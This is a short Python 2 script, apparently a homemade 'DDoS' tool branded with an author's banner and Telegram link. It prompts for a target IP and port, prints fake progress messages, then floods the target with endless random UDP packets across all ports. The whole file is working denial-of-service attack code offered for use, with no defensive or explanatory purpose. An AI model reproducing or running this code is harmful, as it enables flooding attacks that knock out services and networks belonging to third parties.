import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet yen yang mjaze")
print
print "script a yen yang mjaze"
print "my telegram  :   https://t.me/yenyangmajaze"
print
ip = raw_input("what a ip : ")
port = input("what a port : ")

os.system("clear")
os.system("figlet yen yang mjaze")
print("chek{.......... }5%")
time.sleep(1)
os.system("clear") 
print("Security{yen yang... }10%")
time.sleep(2)
os.system("clear") 
print("Loading{yen yang majaze}40%")
time.sleep(3)
os.system("clear") 
print("amade saze{yen yang majaze..}90%")
time.sleep(3)
os.system("clear") 
print("goooooooooo{.............................. 100%")
time.sleep(4)
os.system("clear") 
print("please wait")
time.sleep(6)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "paket%s DDOS your site %s or port is:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

